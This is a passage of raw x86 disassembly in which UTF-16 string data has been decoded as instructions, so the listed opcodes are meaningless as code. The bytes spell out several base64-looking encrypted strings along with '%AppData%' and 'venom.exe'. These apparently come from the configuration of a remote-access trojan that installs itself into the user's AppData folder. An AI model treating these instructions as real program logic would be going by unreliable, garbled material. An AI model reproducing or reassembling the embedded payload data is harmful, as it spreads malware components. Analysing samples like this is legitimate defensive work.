  4096ba:	00 78 00             	add    %bh,0x0(%eax)
  4096bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4096be:	00 6b 00             	add    %ch,0x0(%ebx)
  4096c1:	6b 00 39             	imul   $0x39,(%eax),%eax
  4096c4:	00 66 00             	add    %ah,0x0(%esi)
  4096c7:	30 00                	xor    %al,(%eax)
  4096c9:	77 00                	ja     0x4096cb
  4096cb:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4096d0:	34 00                	xor    $0x0,%al
  4096d2:	55                   	push   %ebp
  4096d3:	00 75 00             	add    %dh,0x0(%ebp)
  4096d6:	6b 00 44             	imul   $0x44,(%eax),%eax
  4096d9:	00 37                	add    %dh,(%edi)
  4096db:	00 70 00             	add    %dh,0x0(%eax)
  4096de:	70 00                	jo     0x4096e0
  4096e0:	6a 00                	push   $0x0
  4096e2:	43                   	inc    %ebx
  4096e3:	00 59 00             	add    %bl,0x0(%ecx)
  4096e6:	68 00 79 00 49       	push   $0x49007900
  4096eb:	00 79 00             	add    %bh,0x0(%ecx)
  4096ee:	78 00                	js     0x4096f0
  4096f0:	6c                   	insb   (%dx),%es:(%edi)
  4096f1:	00 38                	add    %bh,(%eax)
  4096f3:	00 4d 00             	add    %cl,0x0(%ebp)
  4096f6:	4b                   	dec    %ebx
  4096f7:	00 43 00             	add    %al,0x0(%ebx)
  4096fa:	39 00                	cmp    %eax,(%eax)
  4096fc:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  409700:	59                   	pop    %ecx
  409701:	00 51 00             	add    %dl,0x0(%ecx)
  409704:	38 00                	cmp    %al,(%eax)
  409706:	6e                   	outsb  %ds:(%esi),(%dx)
  409707:	00 72 00             	add    %dh,0x0(%edx)
  40970a:	31 00                	xor    %eax,(%eax)
  40970c:	73 00                	jae    0x40970e
  40970e:	50                   	push   %eax
  40970f:	00 4b 00             	add    %cl,0x0(%ebx)
  409712:	2b 00                	sub    (%eax),%eax
  409714:	2b 00                	sub    (%eax),%eax
  409716:	69 00 4e 00 36 00    	imul   $0x36004e,(%eax),%eax
  40971c:	6c                   	insb   (%dx),%es:(%edi)
  40971d:	00 72 00             	add    %dh,0x0(%edx)
  409720:	76 00                	jbe    0x409722
  409722:	49                   	dec    %ecx
  409723:	00 38                	add    %bh,(%eax)
  409725:	00 33                	add    %dh,(%ebx)
  409727:	00 32                	add    %dh,(%edx)
  409729:	00 51 00             	add    %dl,0x0(%ecx)
  40972c:	66 00 76 00          	data16 add %dh,0x0(%esi)
  409730:	33 00                	xor    (%eax),%eax
  409732:	7a 00                	jp     0x409734
  409734:	57                   	push   %edi
  409735:	00 35 00 32 00 64    	add    %dh,0x64003200
  40973b:	00 62 00             	add    %ah,0x0(%edx)
  40973e:	35 00 69 00 4e       	xor    $0x4e006900,%eax
  409743:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  409747:	00 2b                	add    %ch,(%ebx)
  409749:	00 62 00             	add    %ah,0x0(%edx)
  40974c:	59                   	pop    %ecx
  40974d:	00 62 00             	add    %ah,0x0(%edx)
  409750:	30 00                	xor    %al,(%eax)
  409752:	54                   	push   %esp
  409753:	00 57 00             	add    %dl,0x0(%edi)
  409756:	77 00                	ja     0x409758
  409758:	6f                   	outsl  %ds:(%esi),(%dx)
  409759:	00 56 00             	add    %dl,0x0(%esi)
  40975c:	4e                   	dec    %esi
  40975d:	00 65 00             	add    %ah,0x0(%ebp)
  409760:	34 00                	xor    $0x0,%al
  409762:	6d                   	insl   (%dx),%es:(%edi)
  409763:	00 68 00             	add    %ch,0x0(%eax)
  409766:	45                   	inc    %ebp
  409767:	00 34 00             	add    %dh,(%eax,%eax,1)
  40976a:	58                   	pop    %eax
  40976b:	00 4e 00             	add    %cl,0x0(%esi)
  40976e:	61                   	popa
  40976f:	00 76 00             	add    %dh,0x0(%esi)
  409772:	43                   	inc    %ebx
  409773:	00 4d 00             	add    %cl,0x0(%ebp)
  409776:	30 00                	xor    %al,(%eax)
  409778:	42                   	inc    %edx
  409779:	00 51 00             	add    %dl,0x0(%ecx)
  40977c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409781:	80 b1 31 00 73 00 4e 	xorb   $0x4e,0x730031(%ecx)
  409788:	00 69 00             	add    %ch,0x0(%ecx)
  40978b:	4a                   	dec    %edx
  40978c:	00 4a 00             	add    %cl,0x0(%edx)
  40978f:	52                   	push   %edx
  409790:	00 42 00             	add    %al,0x0(%edx)
  409793:	4b                   	dec    %ebx
  409794:	00 31                	add    %dh,(%ecx)
  409796:	00 39                	add    %bh,(%ecx)
  409798:	00 77 00             	add    %dh,0x0(%edi)
  40979b:	6c                   	insb   (%dx),%es:(%edi)
  40979c:	00 2f                	add    %ch,(%edi)
  40979e:	00 6e 00             	add    %ch,0x0(%esi)
  4097a1:	4e                   	dec    %esi
  4097a2:	00 4b 00             	add    %cl,0x0(%ebx)
  4097a5:	33 00                	xor    (%eax),%eax
  4097a7:	4e                   	dec    %esi
  4097a8:	00 2b                	add    %ch,(%ebx)
  4097aa:	00 66 00             	add    %ah,0x0(%esi)
  4097ad:	73 00                	jae    0x4097af
  4097af:	2f                   	das
  4097b0:	00 36                	add    %dh,(%esi)
  4097b2:	00 37                	add    %dh,(%edi)
  4097b4:	00 2b                	add    %ch,(%ebx)
  4097b6:	00 35 00 35 00 6c    	add    %dh,0x6c003500
  4097bc:	00 52 00             	add    %dl,0x0(%edx)
  4097bf:	4d                   	dec    %ebp
  4097c0:	00 6d 00             	add    %ch,0x0(%ebp)
  4097c3:	57                   	push   %edi
  4097c4:	00 4a 00             	add    %cl,0x0(%edx)
  4097c7:	4a                   	dec    %edx
  4097c8:	00 77 00             	add    %dh,0x0(%edi)
  4097cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4097cc:	00 6e 00             	add    %ch,0x0(%esi)
  4097cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4097d0:	00 38                	add    %bh,(%eax)
  4097d2:	00 69 00             	add    %ch,0x0(%ecx)
  4097d5:	74 00                	je     0x4097d7
  4097d7:	47                   	inc    %edi
  4097d8:	00 77 00             	add    %dh,0x0(%edi)
  4097db:	76 00                	jbe    0x4097dd
  4097dd:	76 00                	jbe    0x4097df
  4097df:	70 00                	jo     0x4097e1
  4097e1:	58                   	pop    %eax
  4097e2:	00 77 00             	add    %dh,0x0(%edi)
  4097e5:	37                   	aaa
  4097e6:	00 4e 00             	add    %cl,0x0(%esi)
  4097e9:	49                   	dec    %ecx
  4097ea:	00 6a 00             	add    %ch,0x0(%edx)
  4097ed:	6c                   	insb   (%dx),%es:(%edi)
  4097ee:	00 32                	add    %dh,(%edx)
  4097f0:	00 6d 00             	add    %ch,0x0(%ebp)
  4097f3:	37                   	aaa
  4097f4:	00 49 00             	add    %cl,0x0(%ecx)
  4097f7:	44                   	inc    %esp
  4097f8:	00 6b 00             	add    %ch,0x0(%ebx)
  4097fb:	36 00 38             	add    %bh,%ss:(%eax)
  4097fe:	00 68 00             	add    %ch,0x0(%eax)
  409801:	34 00                	xor    $0x0,%al
  409803:	66 00 67 00          	data16 add %ah,0x0(%edi)
  409807:	76 00                	jbe    0x409809
  409809:	79 00                	jns    0x40980b
  40980b:	33 00                	xor    (%eax),%eax
  40980d:	4f                   	dec    %edi
  40980e:	00 49 00             	add    %cl,0x0(%ecx)
  409811:	62 00                	bound  %eax,(%eax)
  409813:	39 00                	cmp    %eax,(%eax)
  409815:	6e                   	outsb  %ds:(%esi),(%dx)
  409816:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40981a:	00 4d 00             	add    %cl,0x0(%ebp)
  40981d:	75 00                	jne    0x40981f
  40981f:	5a                   	pop    %edx
  409820:	00 2f                	add    %ch,(%edi)
  409822:	00 41 00             	add    %al,0x0(%ecx)
  409825:	31 00                	xor    %eax,(%eax)
  409827:	5a                   	pop    %edx
  409828:	00 50 00             	add    %dl,0x0(%eax)
  40982b:	39 00                	cmp    %eax,(%eax)
  40982d:	77 00                	ja     0x40982f
  40982f:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409834:	80 b1 64 00 35 00 74 	xorb   $0x74,0x350064(%ecx)
  40983b:	00 6e 00             	add    %ch,0x0(%esi)
  40983e:	37                   	aaa
  40983f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409842:	59                   	pop    %ecx
  409843:	00 62 00             	add    %ah,0x0(%edx)
  409846:	51                   	push   %ecx
  409847:	00 37                	add    %dh,(%edi)
  409849:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40984d:	00 39                	add    %bh,(%ecx)
  40984f:	00 39                	add    %bh,(%ecx)
  409851:	00 56 00             	add    %dl,0x0(%esi)
  409854:	6e                   	outsb  %ds:(%esi),(%dx)
  409855:	00 73 00             	add    %dh,0x0(%ebx)
  409858:	70 00                	jo     0x40985a
  40985a:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40985e:	63 00                	arpl   %eax,(%eax)
  409860:	30 00                	xor    %al,(%eax)
  409862:	62 00                	bound  %eax,(%eax)
  409864:	73 00                	jae    0x409866
  409866:	57                   	push   %edi
  409867:	00 35 00 61 00 6e    	add    %dh,0x6e006100
  40986d:	00 51 00             	add    %dl,0x0(%ecx)
  409870:	76 00                	jbe    0x409872
  409872:	47                   	inc    %edi
  409873:	00 37                	add    %dh,(%edi)
  409875:	00 47 00             	add    %al,0x0(%edi)
  409878:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40987c:	51                   	push   %ecx
  40987d:	00 5a 00             	add    %bl,0x0(%edx)
  409880:	52                   	push   %edx
  409881:	00 53 00             	add    %dl,0x0(%ebx)
  409884:	37                   	aaa
  409885:	00 7a 00             	add    %bh,0x0(%edx)
  409888:	51                   	push   %ecx
  409889:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40988d:	00 68 00             	add    %ch,0x0(%eax)
  409890:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  409894:	6e                   	outsb  %ds:(%esi),(%dx)
  409895:	00 4d 00             	add    %cl,0x0(%ebp)
  409898:	73 00                	jae    0x40989a
  40989a:	33 00                	xor    (%eax),%eax
  40989c:	41                   	inc    %ecx
  40989d:	00 77 00             	add    %dh,0x0(%edi)
  4098a0:	72 00                	jb     0x4098a2
  4098a2:	4c                   	dec    %esp
  4098a3:	00 57 00             	add    %dl,0x0(%edi)
  4098a6:	4e                   	dec    %esi
  4098a7:	00 37                	add    %dh,(%edi)
  4098a9:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4098ad:	00 6a 00             	add    %ch,0x0(%edx)
  4098b0:	75 00                	jne    0x4098b2
  4098b2:	61                   	popa
  4098b3:	00 57 00             	add    %dl,0x0(%edi)
  4098b6:	76 00                	jbe    0x4098b8
  4098b8:	62 00                	bound  %eax,(%eax)
  4098ba:	31 00                	xor    %eax,(%eax)
  4098bc:	72 00                	jb     0x4098be
  4098be:	4d                   	dec    %ebp
  4098bf:	00 62 00             	add    %ah,0x0(%edx)
  4098c2:	6b 00 74             	imul   $0x74,(%eax),%eax
  4098c5:	00 42 00             	add    %al,0x0(%edx)
  4098c8:	4b                   	dec    %ebx
  4098c9:	00 62 00             	add    %ah,0x0(%edx)
  4098cc:	58                   	pop    %eax
  4098cd:	00 31                	add    %dh,(%ecx)
  4098cf:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  4098d3:	00 57 00             	add    %dl,0x0(%edi)
  4098d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4098d7:	00 67 00             	add    %ah,0x0(%edi)
  4098da:	5a                   	pop    %edx
  4098db:	00 6b 00             	add    %ch,0x0(%ebx)
  4098de:	74 00                	je     0x4098e0
  4098e0:	67 00 3d             	add    %bh,(%di)
  4098e3:	00 3d 00 00 13 25    	add    %bh,0x25130000
  4098e9:	00 41 00             	add    %al,0x0(%ecx)
  4098ec:	70 00                	jo     0x4098ee
  4098ee:	70 00                	jo     0x4098f0
  4098f0:	44                   	inc    %esp
  4098f1:	00 61 00             	add    %ah,0x0(%ecx)
  4098f4:	74 00                	je     0x4098f6
  4098f6:	61                   	popa
  4098f7:	00 25 00 00 13 76    	add    %ah,0x76130000
  4098fd:	00 65 00             	add    %ah,0x0(%ebp)
  409900:	6e                   	outsb  %ds:(%esi),(%dx)
  409901:	00 6f 00             	add    %ch,0x0(%edi)
  409904:	6d                   	insl   (%dx),%es:(%edi)
  409905:	00 2e                	add    %ch,(%esi)
  409907:	00 65 00             	add    %ah,0x0(%ebp)
  40990a:	78 00                	js     0x40990c
  40990c:	65 00 00             	add    %al,%gs:(%eax)
  40990f:	59                   	pop    %ecx
  409910:	53                   	push   %ebx
  409911:	00 6a 00             	add    %ch,0x0(%edx)
  409914:	52                   	push   %edx
  409915:	00 77 00             	add    %dh,0x0(%edi)
  409918:	56                   	push   %esi
  409919:	00 48 00             	add    %cl,0x0(%eax)
  40991c:	4e                   	dec    %esi
  40991d:	00 73 00             	add    %dh,0x0(%ebx)
  409920:	5a                   	pop    %edx
  409921:	00 32                	add    %dh,(%edx)
  409923:	00 35 00 74 00 53    	add    %dh,0x53007400
  409929:	00 56 00             	add    %dl,0x0(%esi)
  40992c:	4a                   	dec    %edx
  40992d:	00 6b 00             	add    %ch,0x0(%ebx)
  409930:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409934:	31 00                	xor    %eax,(%eax)
  409936:	5a                   	pop    %edx
  409937:	00 53 00             	add    %dl,0x0(%ebx)
  40993a:	47                   	inc    %edi
  40993b:	00 6f 00             	add    %ch,0x0(%edi)
  40993e:	35 00 61 00 46       	xor    $0x46006100,%eax
  409943:	00 4e 00             	add    %cl,0x0(%esi)
  409946:	48                   	dec    %eax
  409947:	00 59 00             	add    %bl,0x0(%ecx)
  40994a:	56                   	push   %esi
  40994b:	00 4e 00             	add    %cl,0x0(%esi)
  40994e:	47                   	inc    %edi
  40994f:	00 57 00             	add    %dl,0x0(%edi)
  409952:	6c                   	insb   (%dx),%es:(%edi)
  409953:	00 51 00             	add    %dl,0x0(%ecx)
  409956:	79 00                	jns    0x409958
  409958:	61                   	popa
  409959:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40995d:	00 33                	add    %dh,(%ebx)
  40995f:	00 55 00             	add    %dl,0x0(%ebp)
  409962:	56                   	push   %esi
  409963:	00 63 00             	add    %ah,0x0(%ebx)
  409966:	3d 00 00 80 d9       	cmp    $0xd9800000,%eax
  40996b:	77 00                	ja     0x40996d
  40996d:	7a 00                	jp     0x40996f
  40996f:	42                   	inc    %edx
  409970:	00 41 00             	add    %al,0x0(%ecx)
  409973:	6f                   	outsl  %ds:(%esi),(%dx)
  409974:	00 42 00             	add    %al,0x0(%edx)
  409977:	48                   	dec    %eax
  409978:	00 46 00             	add    %al,0x0(%esi)
  40997b:	7a 00                	jp     0x40997d
  40997d:	71 00                	jno    0x40997f
  40997f:	43                   	inc    %ebx
  409980:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  409984:	00 71 00             	add    %dh,0x0(%ecx)
  409987:	74 00                	je     0x409989
  409989:	2f                   	das
  40998a:	00 58 00             	add    %bl,0x0(%eax)
  40998d:	2b 00                	sub    (%eax),%eax
  40998f:	37                   	aaa
  409990:	00 57 00             	add    %dl,0x0(%edi)
  409993:	62 00                	bound  %eax,(%eax)
  409995:	59                   	pop    %ecx
  409996:	00 62 00             	add    %ah,0x0(%edx)
  409999:	69 00 79 00 45 00    	imul   $0x450079,(%eax),%eax
  40999f:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a0:	00 46 00             	add    %al,0x0(%esi)
  4099a3:	79 00                	jns    0x4099a5
  4099a5:	65 00 31             	add    %dh,%gs:(%ecx)
  4099a8:	00 77 00             	add    %dh,0x0(%edi)
  4099ab:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  4099af:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b0:	00 39                	add    %bh,(%ecx)
  4099b2:	00 5a 00             	add    %bl,0x0(%edx)
  4099b5:	77 00                	ja     0x4099b7
  4099b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4099b8:	00 79 00             	add    %bh,0x0(%ecx)
  4099bb:	42                   	inc    %edx
  4099bc:	00 53 00             	add    %dl,0x0(%ebx)
  4099bf:	4f                   	dec    %edi
  4099c0:	00 6f 00             	add    %ch,0x0(%edi)
  4099c3:	30 00                	xor    %al,(%eax)
  4099c5:	5a                   	pop    %edx
  4099c6:	00 35 00 6f 00 44    	add    %dh,0x44006f00
  4099cc:	00 7a 00             	add    %bh,0x0(%edx)
  4099cf:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4099d3:	63 00                	arpl   %eax,(%eax)
  4099d5:	6d                   	insl   (%dx),%es:(%edi)
  4099d6:	00 47 00             	add    %al,0x0(%edi)
  4099d9:	50                   	push   %eax
  4099da:	00 33                	add    %dh,(%ebx)
  4099dc:	00 2b                	add    %ch,(%ebx)
  4099de:	00 52 00             	add    %dl,0x0(%edx)
  4099e1:	68 00 37 00 2f       	push   $0x2f003700
  4099e6:	00 78 00             	add    %bh,0x0(%eax)
  4099e9:	30 00                	xor    %al,(%eax)
  4099eb:	57                   	push   %edi
  4099ec:	00 77 00             	add    %dh,0x0(%edi)
  4099ef:	77 00                	ja     0x4099f1
  4099f1:	71 00                	jno    0x4099f3
  4099f3:	32 00                	xor    (%eax),%al
  4099f5:	39 00                	cmp    %eax,(%eax)
  4099f7:	34 00                	xor    $0x0,%al
  4099f9:	32 00                	xor    (%eax),%al
  4099fb:	44                   	inc    %esp
  4099fc:	00 57 00             	add    %dl,0x0(%edi)
  4099ff:	4d                   	dec    %ebp
  409a00:	00 58 00             	add    %bl,0x0(%eax)
  409a03:	6f                   	outsl  %ds:(%esi),(%dx)
  409a04:	00 63 00             	add    %ah,0x0(%ebx)
  409a07:	33 00                	xor    (%eax),%eax
  409a09:	39 00                	cmp    %eax,(%eax)
  409a0b:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  409a0f:	61                   	popa
  409a10:	00 50 00             	add    %dl,0x0(%eax)
  409a13:	70 00                	jo     0x409a15
  409a15:	61                   	popa
  409a16:	00 75 00             	add    %dh,0x0(%ebp)
  409a19:	6e                   	outsb  %ds:(%esi),(%dx)
  409a1a:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  409a1e:	00 45 00             	add    %al,0x0(%ebp)
  409a21:	4f                   	dec    %edi
  409a22:	00 5a 00             	add    %bl,0x0(%edx)
  409a25:	64 00 64 00 65       	add    %ah,%fs:0x65(%eax,%eax,1)
  409a2a:	00 67 00             	add    %ah,0x0(%edi)
  409a2d:	5a                   	pop    %edx
  409a2e:	00 53 00             	add    %dl,0x0(%ebx)
  409a31:	69 00 42 00 52 00    	imul   $0x520042,(%eax),%eax
  409a37:	74 00                	je     0x409a39
  409a39:	51                   	push   %ecx
  409a3a:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409a3e:	00 59 00             	add    %bl,0x0(%ecx)
  409a41:	3d 00 00 92 59       	cmp    $0x59920000,%eax
  409a46:	31 00                	xor    %eax,(%eax)
  409a48:	31 00                	xor    %eax,(%eax)
  409a4a:	58                   	pop    %eax
  409a4b:	00 59 00             	add    %bl,0x0(%ecx)
  409a4e:	32 00                	xor    (%eax),%al
  409a50:	52                   	push   %edx
  409a51:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  409a55:	00 58 00             	add    %bl,0x0(%eax)
  409a58:	42                   	inc    %edx
  409a59:	00 6b 00             	add    %ch,0x0(%ebx)
  409a5c:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  409a60:	77 00                	ja     0x409a62
  409a62:	75 00                	jne    0x409a64
  409a64:	6f                   	outsl  %ds:(%esi),(%dx)
  409a65:	00 68 00             	add    %ch,0x0(%eax)
  409a68:	6f                   	outsl  %ds:(%esi),(%dx)
  409a69:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a6c:	74 00                	je     0x409a6e
  409a6e:	39 00                	cmp    %eax,(%eax)
  409a70:	6c                   	insb   (%dx),%es:(%edi)
  409a71:	00 6d 00             	add    %ch,0x0(%ebp)
  409a74:	68 00 6b 00 49       	push   $0x49006b00
  409a79:	00 41 00             	add    %al,0x0(%ecx)
  409a7c:	2b 00                	sub    (%eax),%eax
  409a7e:	53                   	push   %ebx
  409a7f:	00 37                	add    %dh,(%edi)
  409a81:	00 2b                	add    %ch,(%ebx)
  409a83:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  409a87:	00 36                	add    %dh,(%esi)
  409a89:	00 38                	add    %bh,(%eax)
  409a8b:	00 38                	add    %bh,(%eax)
  409a8d:	00 49 00             	add    %cl,0x0(%ecx)
  409a90:	30 00                	xor    %al,(%eax)
  409a92:	39 00                	cmp    %eax,(%eax)
  409a94:	5a                   	pop    %edx
  409a95:	00 46 00             	add    %al,0x0(%esi)
  409a98:	66 00 56 00          	data16 add %dl,0x0(%esi)
  409a9c:	5a                   	pop    %edx
  409a9d:	00 34 00             	add    %dh,(%eax,%eax,1)
  409aa0:	62 00                	bound  %eax,(%eax)
  409aa2:	2b 00                	sub    (%eax),%eax
  409aa4:	75 00                	jne    0x409aa6
  409aa6:	50                   	push   %eax
  409aa7:	00 6b 00             	add    %ch,0x0(%ebx)
  409aaa:	75 00                	jne    0x409aac
  409aac:	52                   	push   %edx
  409aad:	00 57 00             	add    %dl,0x0(%edi)
  409ab0:	48                   	dec    %eax
  409ab1:	00 53 00             	add    %dl,0x0(%ebx)
  409ab4:	5a                   	pop    %edx
  409ab5:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  409ab9:	00 6a 00             	add    %ch,0x0(%edx)
  409abc:	4c                   	dec    %esp
  409abd:	00 38                	add    %bh,(%eax)
  409abf:	00 52 00             	add    %dl,0x0(%edx)
  409ac2:	74 00                	je     0x409ac4
  409ac4:	4a                   	dec    %edx
  409ac5:	00 45 00             	add    %al,0x0(%ebp)
  409ac8:	37                   	aaa
  409ac9:	00 36                	add    %dh,(%esi)
  409acb:	00 51 00             	add    %dl,0x0(%ecx)
  409ace:	62 00                	bound  %eax,(%eax)
  409ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad1:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  409ad5:	00 48 00             	add    %cl,0x0(%eax)
  409ad8:	42                   	inc    %edx
  409ad9:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  409add:	00 53 00             	add    %dl,0x0(%ebx)
  409ae0:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  409ae4:	37                   	aaa
  409ae5:	00 30                	add    %dh,(%eax)
  409ae7:	00 46 00             	add    %al,0x0(%esi)
  409aea:	48                   	dec    %eax
  409aeb:	00 45 00             	add    %al,0x0(%ebp)
  409aee:	4b                   	dec    %ebx
  409aef:	00 37                	add    %dh,(%edi)
  409af1:	00 48 00             	add    %cl,0x0(%eax)
  409af4:	4f                   	dec    %edi
  409af5:	00 72 00             	add    %dh,0x0(%edx)
  409af8:	62 00                	bound  %eax,(%eax)
  409afa:	30 00                	xor    %al,(%eax)
  409afc:	57                   	push   %edi
  409afd:	00 76 00             	add    %dh,0x0(%esi)
  409b00:	6e                   	outsb  %ds:(%esi),(%dx)
  409b01:	00 7a 00             	add    %bh,0x0(%edx)
  409b04:	67 00 4f 00          	add    %cl,0x0(%bx)
  409b08:	33 00                	xor    (%eax),%eax
  409b0a:	63 00                	arpl   %eax,(%eax)
  409b0c:	50                   	push   %eax
  409b0d:	00 65 00             	add    %ah,0x0(%ebp)
  409b10:	44                   	inc    %esp
  409b11:	00 78 00             	add    %bh,0x0(%eax)
  409b14:	54                   	push   %esp
  409b15:	00 32                	add    %dh,(%edx)
  409b17:	00 47 00             	add    %al,0x0(%edi)
  409b1a:	78 00                	js     0x409b1c
  409b1c:	37                   	aaa
  409b1d:	00 42 00             	add    %al,0x0(%edx)
  409b20:	6e                   	outsb  %ds:(%esi),(%dx)
  409b21:	00 62 00             	add    %ah,0x0(%edx)
  409b24:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409b28:	68 00 70 00 66       	push   $0x66007000
  409b2d:	00 61 00             	add    %ah,0x0(%ecx)
  409b30:	78 00                	js     0x409b32
  409b32:	78 00                	js     0x409b34
  409b34:	57                   	push   %edi
  409b35:	00 46 00             	add    %al,0x0(%esi)
  409b38:	44                   	inc    %esp
  409b39:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  409b3d:	00 4e 00             	add    %cl,0x0(%esi)
  409b40:	67 00 4d 00          	add    %cl,0x0(%di)
  409b44:	58                   	pop    %eax
  409b45:	00 79 00             	add    %bh,0x0(%ecx)
  409b48:	59                   	pop    %ecx
  409b49:	00 65 00             	add    %ah,0x0(%ebp)
  409b4c:	69 00 69 00 68 00    	imul   $0x680069,(%eax),%eax
  409b52:	6e                   	outsb  %ds:(%esi),(%dx)
  409b53:	00 50 00             	add    %dl,0x0(%eax)
  409b56:	72 00                	jb     0x409b58
  409b58:	37                   	aaa
  409b59:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  409b5d:	00 71 00             	add    %dh,0x0(%ecx)
  409b60:	34 00                	xor    $0x0,%al
  409b62:	39 00                	cmp    %eax,(%eax)
  409b64:	47                   	inc    %edi
  409b65:	00 46 00             	add    %al,0x0(%esi)
  409b68:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  409b6c:	42                   	inc    %edx
  409b6d:	00 46 00             	add    %al,0x0(%esi)
  409b70:	71 00                	jno    0x409b72
  409b72:	49                   	dec    %ecx
  409b73:	00 41 00             	add    %al,0x0(%ecx)
  409b76:	68 00 32 00 69       	push   $0x69003200
  409b7b:	00 77 00             	add    %dh,0x0(%edi)
  409b7e:	4f                   	dec    %edi
  409b7f:	00 4e 00             	add    %cl,0x0(%esi)
  409b82:	70 00                	jo     0x409b84
  409b84:	50                   	push   %eax
  409b85:	00 2f                	add    %ch,(%edi)
  409b87:	00 75 00             	add    %dh,0x0(%ebp)
  409b8a:	34 00                	xor    $0x0,%al
  409b8c:	62 00                	bound  %eax,(%eax)
  409b8e:	4b                   	dec    %ebx
  409b8f:	00 63 00             	add    %ah,0x0(%ebx)
  409b92:	45                   	inc    %ebp
  409b93:	00 7a 00             	add    %bh,0x0(%edx)
  409b96:	66 00 43 00          	data16 add %al,0x0(%ebx)
  409b9a:	69 00 55 00 6b 00    	imul   $0x6b0055,(%eax),%eax
  409ba0:	30 00                	xor    %al,(%eax)
  409ba2:	59                   	pop    %ecx
  409ba3:	00 5a 00             	add    %bl,0x0(%edx)
  409ba6:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  409baa:	38 00                	cmp    %al,(%eax)
  409bac:	45                   	inc    %ebp
  409bad:	00 42 00             	add    %al,0x0(%edx)
  409bb0:	6d                   	insl   (%dx),%es:(%edi)
  409bb1:	00 6f 00             	add    %ch,0x0(%edi)
  409bb4:	69 00 74 00 66 00    	imul   $0x660074,(%eax),%eax
  409bba:	62 00                	bound  %eax,(%eax)
  409bbc:	32 00                	xor    (%eax),%al
  409bbe:	52                   	push   %edx
  409bbf:	00 6e 00             	add    %ch,0x0(%esi)
  409bc2:	49                   	dec    %ecx
  409bc3:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  409bc7:	00 72 00             	add    %dh,0x0(%edx)
  409bca:	33 00                	xor    (%eax),%eax
  409bcc:	79 00                	jns    0x409bce
  409bce:	34 00                	xor    $0x0,%al
  409bd0:	4e                   	dec    %esi
  409bd1:	00 43 00             	add    %al,0x0(%ebx)
  409bd4:	6f                   	outsl  %ds:(%esi),(%dx)
  409bd5:	00 4e 00             	add    %cl,0x0(%esi)
  409bd8:	6b 00 42             	imul   $0x42,(%eax),%eax
  409bdb:	00 35 00 5a 00 69    	add    %dh,0x69005a00
  409be1:	00 66 00             	add    %ah,0x0(%esi)
  409be4:	32 00                	xor    (%eax),%al
  409be6:	72 00                	jb     0x409be8
  409be8:	2b 00                	sub    (%eax),%eax
  409bea:	48                   	dec    %eax
  409beb:	00 62 00             	add    %ah,0x0(%edx)
  409bee:	33 00                	xor    (%eax),%eax
  409bf0:	6b 00 41             	imul   $0x41,(%eax),%eax
  409bf3:	00 72 00             	add    %dh,0x0(%edx)
  409bf6:	70 00                	jo     0x409bf8
  409bf8:	57                   	push   %edi
  409bf9:	00 70 00             	add    %dh,0x0(%eax)
  409bfc:	44                   	inc    %esp
  409bfd:	00 36                	add    %dh,(%esi)
  409bff:	00 30                	add    %dh,(%eax)
  409c01:	00 6e 00             	add    %ch,0x0(%esi)
  409c04:	33 00                	xor    (%eax),%eax
  409c06:	76 00                	jbe    0x409c08
  409c08:	64 00 39             	add    %bh,%fs:(%ecx)
  409c0b:	00 61 00             	add    %ah,0x0(%ecx)
  409c0e:	54                   	push   %esp
  409c0f:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  409c13:	00 47 00             	add    %al,0x0(%edi)
  409c16:	4c                   	dec    %esp
  409c17:	00 65 00             	add    %ah,0x0(%ebp)
  409c1a:	67 00 57 00          	add    %dl,0x0(%bx)
  409c1e:	49                   	dec    %ecx
  409c1f:	00 78 00             	add    %bh,0x0(%eax)
  409c22:	34 00                	xor    $0x0,%al
  409c24:	59                   	pop    %ecx
  409c25:	00 32                	add    %dh,(%edx)
  409c27:	00 39                	add    %bh,(%ecx)
  409c29:	00 6a 00             	add    %ch,0x0(%edx)
  409c2c:	4a                   	dec    %edx
  409c2d:	00 78 00             	add    %bh,0x0(%eax)
  409c30:	61                   	popa
  409c31:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c34:	6e                   	outsb  %ds:(%esi),(%dx)
